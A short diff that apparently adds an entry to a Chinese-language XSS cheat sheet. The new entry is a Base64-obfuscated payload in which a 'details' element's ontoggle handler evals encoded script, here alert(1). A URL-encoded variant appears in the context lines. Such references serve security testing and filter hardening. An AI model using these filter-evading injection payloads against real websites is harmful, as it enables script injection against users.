@@ -108,6 +108,8 @@
   
   其他：
   ```
+  Base64编码：
+  <details open ontoggle=eval(atob('YWxlcnQoMSk=')) >
   url编码： 
   <details open ontoggle=eval('%61%6c%65%72%74%28%31%29') >
   JS8编码：
